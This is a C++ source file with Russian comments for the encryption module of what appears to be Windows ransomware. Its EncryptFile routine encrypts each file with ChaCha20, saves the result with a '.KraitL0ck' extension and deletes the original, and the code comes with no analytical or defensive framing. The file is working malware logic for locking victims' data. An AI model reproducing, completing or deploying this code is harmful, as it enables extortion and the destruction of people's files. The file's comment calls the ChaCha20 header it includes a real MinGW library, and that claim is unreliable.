#include "encryption.h"
#include "keygen.h"
#include <windows.h>
#include <fstream>
#include <vector>
#include <cstring>

// Реальная библиотека ChaCha20 из MinGW
#include <crypto/chacha20.h>

static std::vector<uint8_t> g_key;

void Encryption::Initialize(const std::vector<uint8_t>& key) {
    g_key = key;
}

void Encryption::EncryptFile(const std::string& filePath) {
    std::ifstream in(filePath, std::ios::binary);
    if (!in) return;
    
    in.seekg(0, std::ios::end);
    size_t size = in.tellg();
    if (size > 100 * 1024 * 1024) return;
    if (size == 0) { in.close(); return; }
    
    in.seekg(0, std::ios::beg);
    std::vector<uint8_t> data(size);
    in.read((char*)data.data(), size);
    in.close();
    
    // Генерируем nonce
    uint8_t nonce[12];
    HCRYPTPROV hProv;
    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 12, nonce);
        CryptReleaseContext(hProv, 0);
    } else {
        memset(nonce, 0, 12);
    }
    
    // Шифруем ChaCha20
    std::vector<uint8_t> encrypted(size);
    chacha20_ctx ctx;
    chacha20_init(&ctx, g_key.data(), nonce, 0);
    chacha20_crypt(&ctx, data.data(), encrypted.data(), size);
    chacha20_cleanup(&ctx);
    
    // Записываем: nonce (12) + зашифрованные данные
    std::string newPath = filePath + ".KraitL0ck";
    std::ofstream out(newPath, std::ios::binary);
    out.write((char*)nonce, 12);
    out.write((char*)encrypted.data(), encrypted.size());
    out.close();
    
    DeleteFileA(filePath.c_str());
}

std::vector<uint8_t> Encryption::EncryptData(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> result(data.size());
    uint8_t nonce[12] = {0};
    
    chacha20_ctx ctx;
    chacha20_init(&ctx, g_key.data(), nonce, 0);
    chacha20_crypt(&ctx, data.data(), result.data(), data.size());
    chacha20_cleanup(&ctx);
    
    return result;
}

std::vector<uint8_t> Encryption::DecryptData(const std::vector<uint8_t>& data) {
    // Дешифрация = шифрование с тем же ключом и nonce
    std::vector<uint8_t> result(data.size());
    uint8_t nonce[12] = {0};
    
    chacha20_ctx ctx;
    chacha20_init(&ctx, g_key.data(), nonce, 0);
    chacha20_crypt(&ctx, data.data(), result.data(), data.size());
    chacha20_cleanup(&ctx);
    
    return result;
}
